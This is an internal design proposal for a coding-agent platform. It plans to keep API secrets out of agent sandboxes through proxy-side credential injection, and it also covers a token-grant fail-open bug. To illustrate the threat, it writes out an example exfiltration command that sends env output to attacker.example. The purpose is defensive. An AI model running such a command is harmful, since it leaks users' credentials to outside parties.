# Secret delivery policy — keeping secrets out of the agent

**Date:** 2026-07-26
**Status:** Proposed — not scheduled
**Priority:** Top concern
**Area:** project secrets, sandbox egress, `apps/api/src/router`

Companion to [`2026-07-26-agent-scoped-secret-injection.md`](./2026-07-26-agent-scoped-secret-injection.md),
which shipped as [#5514](https://github.com/kortix-ai/suna/pull/5514) and scoped
*which* secrets an agent receives. This document is about a different axis:
**whether the agent receives the secret at all.**

## The problem

Every project secret is materialized as a plaintext env var inside the sandbox —
written to `/dev/shm/kortix/agent-env.sh` (0600, tmpfs, shredded on shutdown) and
sourced by every shell via `BASH_ENV`. Scoping decides *which* secrets land
there. Nothing stops the agent from reading the ones that do:

```
echo $STRIPE_SECRET_KEY
curl -X POST https://attacker.example/collect -d "$(env)"
```

A prompt-injected agent, a malicious dependency, or a bad `npm install`
postinstall script all reach the same plaintext. Scoping narrows the blast
radius; it does not remove the credential from the blast radius.

This is the top-priority gap in the secrets model.

## What we want

The agent writes **ordinary, unmodified code**:

```sh
curl https://api.stripe.com/v1/charges
```

…and the credential is attached **at the network boundary**, on the way out. The
agent never holds it, never sees it, and cannot exfiltrate it. If the request
goes anywhere other than `api.stripe.com`, no credential is attached.

### Why the existing router is NOT this

`apps/api/src/router/config/proxy-services.ts` already does server-side key
injection for 11+ Kortix-owned services (Tavily, Serper, Firecrawl, Replicate,
Context7, and the LLM providers):

```ts
keyInjection: { type: 'header', headerName: 'Authorization', prefix: 'Bearer ' }
             | { type: 'json_body_field', field: 'api_key' }
allowedRoutes: [{ path, methods, prefixMatch, allowedBodyVersions }]
```

The sandbox holds only `KORTIX_TOKEN` and calls
`${KORTIX_API_URL}/v1/router/{service}`; the API attaches the real upstream key.
The mechanism is proven and in production.

**But it is opt-in by URL rewrite, and that is the crucial difference.** The
agent has to know to call `${KORTIX_API_URL}/v1/router/tavily` instead of
`api.tavily.com`. That means:

- Every integration needs Kortix-specific code. Ordinary SDKs, `curl`, and any
  library that hardcodes its vendor base URL all bypass it.
- It is a *convention*, not a *control*. An agent that ignores the convention and
  calls the vendor directly is not stopped — it just doesn't get a key from us.

The target design requires **no base-URL change and no agent cooperation**. That
is what makes it a security control rather than a helper.

## Design: delivery policy per secret

Add a delivery mode to each project secret. This replaces the narrower
`project_secrets.scope = 'gateway'` idea floated earlier — that would have been
obsolete on arrival, since `gateway` is just one instance of the general rule.

| Mode | Materialized in sandbox env? | Who attaches it | Use for |
|---|---|---|---|
| `env` | yes (today's behavior) | nobody — the agent holds it | a credential a local process genuinely needs (a DB password for a sidecar) |
| `gateway` | **no** | the LLM gateway, server-side | LLM provider keys — **already true in practice, just not modelled** |
| `proxy` | **no** | the egress proxy, per host rule | third-party API keys (Stripe, GitHub, internal APIs) |

A `proxy`-mode secret carries a rule of roughly the shape:

```yaml
STRIPE_SECRET_KEY:
  delivery: proxy
  match: api.stripe.com          # host or *.wildcard
  inject:
    type: header
    name: Authorization
    prefix: "Bearer "
```

`inject` deliberately mirrors the existing `KeyInjectionMethod` union in
`proxy-services.ts` (`header` | `json_body_field`) so the two converge rather
than fork. The long-term shape is that `proxy-services.ts` becomes the
Kortix-owned *preset* layer over the same per-project policy engine.

The mental model — "where does this secret get materialized?" — is also the
product story: **your agent never holds the key.**

## Provider capability

| | Egress filtering | Header injection at boundary |
|---|---|---|
| **E2B** (not used in prod) | `allowOut`/`denyOut`, IP/CIDR/domain, `*.wildcard` | yes — `network.rules` → `transform.headers` (beta) |
| **Daytona** | `networkAllowList` (**max 5 CIDRs**), `domainAllowList`, `networkBlockAll`; **tier-gated** — Tier 1/2 cannot override org settings | none |
| **Platinum** | our own microVM; we own the network namespace | anything we build |

E2B's domain filtering works by Host-header inspection on :80 and SNI on :443.

### The portable design

**We do not need Daytona to support header transforms.** Point Daytona's
`domainAllowList` at *our egress proxy only*. The agent then physically cannot
reach `api.stripe.com` except through us — and we do the injection. Same result
on both prod providers, using each one's actual capability.

Constraint to design around: Daytona's allowlist caps at **5 CIDRs** and is
tier-gated, so the allowlist must be "the Kortix egress proxy," never "the union
of every domain a project uses."

Platinum gets the stronger version — we control the netns directly.

## The hard parts

These are the reasons this is a project and not a patch.

**1. TLS interception.** Attaching a header to an HTTPS request means terminating
TLS at the proxy: a Kortix CA in the sandbox trust store and MITM on egress.
SNI tells you the hostname but does not let you modify an encrypted stream —
which is why E2B's filtering is SNI-based while its `transform.headers` must be
terminating. There is no way around this for header injection.

*Open question:* some enterprise customers will reject a Kortix CA in the trust
store on principle. If so, `proxy` mode must be opt-in per project, which weakens
the marketing claim from "always" to "when enabled."

**2. Enforcement must be network-layer, not env-layer.** Setting `HTTP_PROXY` is
not a control — the agent can `unset` it, and most HTTP clients let you override
per-request. Egress has to be forced by routing/firewall rules the sandbox
process cannot change (iptables/netns on Platinum; `domainAllowList` on Daytona).
A proxy the agent can opt out of provides no security value.

**3. Non-HTTP protocols.** A `proxy`-mode Postgres password or SSH key has no
header to inject into. Those stay `env` mode, or need a protocol-aware proxy.
Scope the first version to HTTP(S) and say so explicitly.

**4. Existing sandboxes.** Delivery policy only takes effect at provision/push
time. A running box that already received a secret in `env` mode still holds it —
same residue problem as agent-scope switching. Changing a secret's policy should
be treated as requiring a new sandbox.

## Related open gap: the executor token

Agent identity has two halves, and #5514 only fixed one.

`mintExecutorToken` (`apps/api/src/platform/services/session-sandbox.ts:129`) has
exactly **one** call site — at sandbox provision. It stamps the token with
`agentGrant` from the session's create-time agent, carrying that agent's
`connectors` and `kortix_cli` grants; the grant is persisted on the token row and
read back by auth middleware to gate routes. **It is never re-minted.**

So re-scoping *env* per prompt is not sufficient on its own: a switched-to agent
would still hold the original agent's powers. This is why
`KORTIX_ENFORCE_AGENT_SECRET_GRANT_LOCK` ships **on** — the 409 is currently the
only thing preventing that escalation. Once identity is re-resolved per prompt,
the lock can relax to plain re-scoping.

There is also a live fail-open on that path: `session-sandbox.ts:143` does
`resolveAgentGrant(...).catch(() => null)`, and `null` means unrestricted. It
calls `loadProjectAgents` **without** `rethrowReadErrors`, so a transient git
failure synthesizes a manifest granting `connectors: 'all'` + `kortix_cli: 'all'`.
This is the same bug class #5514 fixed for env, still open for the token — and
the plumbing to fix it (`rethrowReadErrors`) is already on main.

*Design question to settle first:* re-mint a new token and push it into a live
sandbox, vs. keep one token and re-resolve its grant server-side at auth time.
The latter avoids rotating a credential into a running box and is likely the
right call.

## Suggested sequencing

1. **Token grant fail-closed** — apply `rethrowReadErrors` to
   `resolveAgentGrant`. Small, contained, closes a live fail-open with machinery
   already on main.
2. **Delivery policy, `env` + `gateway` only** — one migration, no egress work,
   no TLS interception. Models what is already true and closes the BYOK-key-in-env
   hole: a key connected through the LLM Providers modal stops being readable as
   `$ANTHROPIC_API_KEY` inside the box.
3. **Identity re-resolved per prompt** — token grant follows the running agent;
   the grant lock relaxes.
4. **`proxy` mode** — CA provisioning, forced egress, per-provider network
   config. The real project, and the marketable one.

Steps 1–2 are days. Steps 3–4 each deserve their own spec.

## Sources

- [E2B — Internet access](https://e2b.dev/docs/network/internet-access)
- [Daytona — Network Limits (Firewall)](https://www.daytona.io/docs/en/network-limits/)
